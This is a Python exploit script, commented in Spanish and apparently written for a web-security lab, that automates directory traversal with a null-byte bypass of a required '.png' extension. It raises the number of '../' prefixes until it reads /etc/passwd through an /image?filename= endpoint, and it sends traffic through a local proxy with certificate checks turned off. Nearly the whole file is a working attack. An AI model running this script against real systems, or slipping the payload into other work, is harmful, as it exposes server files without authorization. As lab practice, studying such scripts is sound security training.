"""
An application may require the user-supplied filename to end with an expected file extension, such as .png. In this case, it might be possible to use a null byte to effectively terminate the file path before the required extension. For example:

filename=../../../etc/passwd%00.png
"""



import sys
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = { 'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080' }
IMAGES_PATH=""
TRAVERSAL_PATTERN="../"

def peticion(url, payload):
    image_url = f"{url}/image?filename={IMAGES_PATH}{payload}"
    r = requests.get(image_url, verify=False, proxies=proxies)
    return r

def directory_traversal_exploit(url, TRAVERSAL_PATTERN):
    payload = "etc/passwd%00.png"
    while True:
        print(payload)
        r = peticion(url, payload)
        if r.status_code // 100 == 2:
            if "root:x" in r.text:
                print("[+] La vulnerabilidad Directory Traversal ha sido explotada con éxito")
                print("[+] Contenido del archivo /etc/passwd:")
                print(r.text)
                break
            else:
                print("[-] La vulnerabilidad Directory Traversal no ha sido explotada con éxito")
                print("[-] El archivo /etc/passwd no ha sido encontrado")
                sys.exit(-1)
        else:
            print(f"El código de estado de la petición es: {r.status_code}")
        payload = TRAVERSAL_PATTERN + payload

def main():
    if len(sys.argv) != 2:
        print("[+] Uso: %s <url>" % sys.argv[0])
        print("[+] Ejemplo: %s www.misitio.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    print("[+] Explotando la vulnerabilidad Directory Traversal")
    directory_traversal_exploit(url, TRAVERSAL_PATTERN)

if __name__ == "__main__":
    main()